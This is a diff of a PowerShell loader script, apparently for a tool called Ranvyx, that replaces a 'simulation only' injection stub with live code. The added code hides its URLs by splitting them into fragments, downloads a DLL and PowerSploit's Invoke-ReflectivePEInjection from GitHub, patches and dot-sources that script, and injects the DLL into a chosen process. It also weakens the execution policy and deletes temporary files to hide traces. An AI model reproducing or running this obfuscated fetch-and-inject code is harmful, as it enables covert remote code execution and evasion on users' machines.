@@ -1,4 +1,4 @@
-# ===== ASCII LOGO =====
+ # ===== ASCII LOGO =====
 $logo = @"
 RRRRR    AAA   N   N V   V Y   Y X   X
 R    R  A   A  NN  N V   V  Y Y   X X 
@@ -109,37 +109,56 @@ if (-not $licResp.success) {
 
 Print-Success "Login success"
 
-# ===== INSTALL =====
-Write-Host "[*] Fetching DLL into memory..." -ForegroundColor Yellow
+$_0x91A = @(
+"https://raw",
+".githubusercontent",
+".com/Reflexeiei885",
+"/ranvyx/refs",
+"/heads/main/",
+"dxgi.dll"
+) -join ""
 
-try {
-    $response = Invoke-WebRequest -Uri "https://raw.githubusercontent.com/Reflexeiei885/ranvyx/refs/heads/main/dxgi.dll" -UseBasicParsing
-    $bytes = $response.Content
-    Write-Host "[+] DLL loaded in memory ($($bytes.Length) bytes)" -ForegroundColor Green
-} catch {
-    Write-Host "[-] Download failed" -ForegroundColor Red
-    exit
-}
+$_0xB2F = Join-Path $env:TEMP (@("dbg","help",".dll") -join "")
 
-Write-Host "Enter PID : " -NoNewline
-$targetPid = Read-Host
+Set-ExecutionPolicy RemoteSigned -Scope CurrentUser -Force -ErrorAction SilentlyContinue
 
-try {
-    $proc = Get-Process -Id $targetPid -ErrorAction Stop
-    Write-Host "[+] Target: $($proc.ProcessName)" -ForegroundColor Green
-} catch {
-    Write-Host "[-] Invalid PID" -ForegroundColor Red
-}
+$_0x7C1 = New-Object (@("System",".Net",".WebClient") -join "")
+$_0x7C1.Headers.Add((@("User","-Agent") -join ""), (@("Moz","illa/","5.0") -join ""))
 
-Write-Host ""
-Write-Host "[*] Preparing injection (simulation)..." -ForegroundColor Yellow
-Start-Sleep 1
+$_0x5F9 = $_0x7C1.DownloadData($_0x91A)
 
-Write-Host "[*] Mapping DLL into memory (simulation)..." -ForegroundColor Cyan
-Start-Sleep 1
+$_0x3D2 = @(
+"https://raw",
+".githubusercontent",
+".com/PowerShellMafia",
+"/PowerSploit/master",
+"/CodeExecution/",
+"Invoke-ReflectivePEInjection.ps1"
+) -join ""
 
-Write-Host "[*] Executing entry point (simulation)..." -ForegroundColor Cyan
-Start-Sleep 1
+$_0x8E4 = "$env:TEMP\Reflective_$(Get-Random).ps1"
 
-Write-Host ""
-Write-Host "[+] Done (simulation only)" -ForegroundColor Green
+Invoke-WebRequest -Uri $_0x3D2 -OutFile $_0x8E4 -UseBasicParsing
+
+$_0xA77 = Get-Content $_0x8E4 -Raw
+
+$_0xA77 = $_0xA77 -replace '\$GetProcAddress\s*=\s*\$UnsafeNativeMethods\.GetMethod\(''GetProcAddress''\)', '$GetProcAddress = $UnsafeNativeMethods.GetMethod(''GetProcAddress'', [Type[]]@([System.Runtime.InteropServices.HandleRef], [String]))'
+
+$_0xA77 = $_0xA77 -replace '\$GetModuleHandle\s*=\s*\$UnsafeNativeMethods\.GetMethod\(''GetModuleHandle''\)', '$GetModuleHandle = $UnsafeNativeMethods.GetMethod(''GetModuleHandle'', [Type[]]@([String]))'
+
+$_0xC11 = "$env:TEMP\Reflective_fixed.ps1"
+
+$_0xA77 | Set-Content $_0xC11 -Encoding UTF8
+
+. $_0xC11
+
+$_0x2AA = Read-Host (@("Enter"," PID") -join "")
+
+Invoke-ReflectivePEInjection -PEBytes $_0x5F9 -ProcId $_0x2AA
+
+notepad "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"
+
+Remove-Item $_0xB2F -Force -ErrorAction SilentlyContinue
+
+Get-ChildItem (@("$env:TEMP","/Reflective_*.ps1") -join "") -ErrorAction SilentlyContinue |
+Remove-Item -Force -ErrorAction SilentlyContinue
